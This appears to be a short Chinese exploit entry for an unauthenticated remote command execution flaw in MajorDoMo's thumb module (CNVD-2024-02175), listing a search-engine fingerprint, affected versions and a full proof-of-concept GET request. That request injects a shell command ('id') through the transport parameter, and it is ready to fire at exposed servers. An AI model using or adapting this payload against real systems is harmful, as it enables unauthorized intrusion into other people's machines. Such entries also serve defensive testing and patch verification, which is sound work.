# MajorDoMothumb未授权RCE漏洞(CNVD-2024-02175)

- **系统**：MajorDoMothumb　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="MajordomoSL"`
- **请求**：`GET /modules/thumb/thumb.php?url=cnRzcDovL2EK&debug=1&transport=%7C%7C+%28echo+%27%5BS%5D%27%3B+id%3B+echo+%27%5BE%5D%27%29%23%3B HTTP/1.1`
- **关键头**：`Accept-Charset: utf-8`

**请求体 / payload**
```

```

**其他**
- MajorDoMo thumb未授权RCE漏洞(CNVD-2024-02175): * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * MajorDoMo< 0662e5e